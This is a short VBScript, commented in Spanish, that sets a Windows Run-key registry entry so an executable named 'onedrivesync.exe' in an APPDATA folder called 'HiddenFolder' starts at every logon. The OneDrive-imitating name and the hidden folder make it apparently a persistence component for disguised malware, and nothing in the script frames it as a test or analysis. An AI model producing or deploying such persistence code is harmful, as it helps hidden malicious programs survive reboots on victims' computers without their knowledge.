' Script para agregar el archivo .exe como aplicación de arranque

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Ruta de los archivos
downloadFolder = objShell.ExpandEnvironmentStrings("%APPDATA%\Roaming\HiddenFolder")
exePath = downloadFolder & "\onedrivesync.exe"

' Agregar la aplicación al registro de arranque
regKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
exeName = "onedrivesync"
cmdLine = Chr(34) & exePath & Chr(34)  ' Comillas para manejar espacios en la ruta

' Añadir la entrada al registro
Set objRegistry = CreateObject("WScript.Shell")
objRegistry.RegWrite regKey & "\" & exeName, cmdLine

' Finalizar
Set objShell = Nothing
Set objFSO = Nothing
Set objRegistry = Nothing
